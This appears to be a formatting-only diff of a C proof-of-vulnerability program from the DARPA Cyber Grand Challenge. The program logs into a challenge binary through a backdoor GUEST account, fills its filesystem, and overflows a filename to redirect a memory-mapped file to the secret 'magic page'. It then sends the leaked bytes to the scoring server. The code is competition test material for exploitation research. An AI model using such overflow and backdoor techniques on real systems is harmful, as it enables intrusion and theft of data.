@@ -24,125 +24,111 @@ THE SOFTWARE.
 
 */
 
-
 #include <libcgc.h>
-#include "stdlib.h"
+
 #include "stdio.h"
+#include "stdlib.h"
 #include "string.h"
 
+int receive_bytes(int fd, void *buffer, size_t count) {
+  size_t total;
+  size_t rxbytes;
 
-int receive_bytes (int fd, void *buffer, size_t count) 
-{
-size_t total;
-size_t rxbytes;
+  total = 0;
 
-    total = 0;
+  while (total < count) {
+    rxbytes = 0;
 
-    while(total < count)  {
-
-        rxbytes = 0;
-
-        if (receive(fd, buffer+total, count-total, &rxbytes)==0 ) {
-
-            total += rxbytes;
-
-        }
-        
-        else {
-
-            return(-1);
-        }
+    if (receive(fd, buffer + total, count - total, &rxbytes) == 0) {
+      total += rxbytes;
 
     }
 
-return 0;
+    else {
+      return (-1);
+    }
+  }
 
+  return 0;
 }
 
+int main(void) {
+  char buffer[60];
+  int i;
 
-int main(void)
-{
+  int pov_type;
+  unsigned int type2_addr;
+  unsigned int type2_length;
+  unsigned int type2_size;
+  unsigned int new_offset_value;
 
-char buffer[60];
-int i;
+  // negotiate a type 2 POV
+  pov_type = 2;
 
-int pov_type;
-unsigned int type2_addr;
-unsigned int type2_length;
-unsigned int type2_size;
-unsigned int new_offset_value;
+  if (write(3, &pov_type, sizeof(pov_type)) == -1) _terminate(-1);
 
+  if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1) _terminate(-1);
 
-	// negotiate a type 2 POV
-	pov_type = 2;
+  if (receive_bytes(3, &type2_size, sizeof(type2_size)) == -1) _terminate(-1);
 
-	if (write(3, &pov_type, sizeof(pov_type)) == -1)
-		_terminate(-1);
+  if (receive_bytes(3, &type2_length, sizeof(type2_length)) == -1)
+    _terminate(-1);
 
-	if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
-		_terminate(-1);
+  // get the login prompt
+  receive_bytes(STDIN, buffer, 7);
 
-	if (receive_bytes(3, &type2_size, sizeof(type2_size)) == -1)
-		_terminate(-1);
+  // login with the backdoor GUEST account
+  write(STDOUT, "GUEST 2\n", 8);
 
-	if (receive_bytes(3, &type2_length, sizeof(type2_length)) == -1)
-		_terminate(-1);
+  // command prompt
+  receive_bytes(STDIN, buffer, 26);
 
-	// get the login prompt
-	receive_bytes(STDIN, buffer, 7);
-	
-	// login with the backdoor GUEST account
-	write(STDOUT, "GUEST 2\n", 8);
+  // get rid of the README.txt file in position 0 of the file directory
+  // this position can be overwritten
+  write(STDOUT, "erase README.txt\n", 17);
 
-	// command prompt
-	receive_bytes(STDIN, buffer, 26);
+  // command prompt
+  receive_bytes(STDIN, buffer, 2);
 
-	// get rid of the README.txt file in position 0 of the file directory
-	// this position can be overwritten 
-	write(STDOUT, "erase README.txt\n", 17);
+  // make a memory mapped file that can be overwritten to exploit the vuln
+  strcpy(buffer, "makememfile exploitme.mem 4096\n");
+  // printf();
+  write(STDOUT, buffer, strlen(buffer));
 
-	// command prompt
-	receive_bytes(STDIN, buffer, 2);
+  receive_bytes(STDIN, buffer, 2);
 
-	// make a memory mapped file that can be overwritten to exploit the vuln
-	strcpy(buffer, "makememfile exploitme.mem 4096\n");
-	// printf();
-	write(STDOUT, buffer, strlen(buffer));
+  // now fill the directory up with files
+  for (i = 0; i < 125; ++i) {
+    sprintf(buffer, "make file$d\n", i);
+    write(STDOUT, buffer, strlen(buffer));
 
-	receive_bytes(STDIN, buffer, 2);
+    receive_bytes(STDIN, buffer, 2);
+  }
 
-	// now fill the directory up with files 
-	for (i = 0; i < 125; ++i ) {
+  // now its time for the overwrite.  only a max sized filename will reach into
+  // the next block of the filesystem and overwrite the memory mapped file's
+  // info
+  strcpy(buffer, "make AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
 
-		sprintf(buffer, "make file$d\n", i);
-		write(STDOUT, buffer, strlen(buffer));
+  // put in the address of the magic page
+  // add two to the end so that it doesn't put a null into the string
+  // prematurely
+  *(int *)(buffer + 41) = type2_addr + 2;
 
-		receive_bytes(STDIN, buffer, 2);
-	}
+  buffer[45] = '\n';
+  write(STDOUT, buffer, 46);
 
-	// now its time for the overwrite.  only a max sized filename will reach into the next 
-	// block of the filesystem and overwrite the memory mapped file's info
-	strcpy(buffer, "make AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+  receive_bytes(STDIN, buffer, 2);
 
-	// put in the address of the magic page
-	// add two to the end so that it doesn't put a null into the string prematurely
-	*(int *)(buffer+41) = type2_addr + 2;
+  // the memory mapped file should now point to the magic page so just read it
+  // to get secret data
+  write(STDOUT, "show exploitme.mem\n", 19);
 
-	buffer[45] = '\n';
-	write(STDOUT, buffer, 46);
+  receive_bytes(STDIN, buffer, 4);
 
-	receive_bytes(STDIN, buffer, 2);
+  // now write the returned data back to the POV server for scoring
+  write(3, buffer, 4);
 
-	// the memory mapped file should now point to the magic page so just read it to get secret data
-	write(STDOUT, "show exploitme.mem\n", 19);
-
-	receive_bytes(STDIN, buffer, 4);
-
-	// now write the returned data back to the POV server for scoring
-	write(3, buffer, 4);
-
-	// send the command to exit the CB
-	write(STDOUT, "exit\n", 5);
-
+  // send the command to exit the CB
+  write(STDOUT, "exit\n", 5);
 }
-
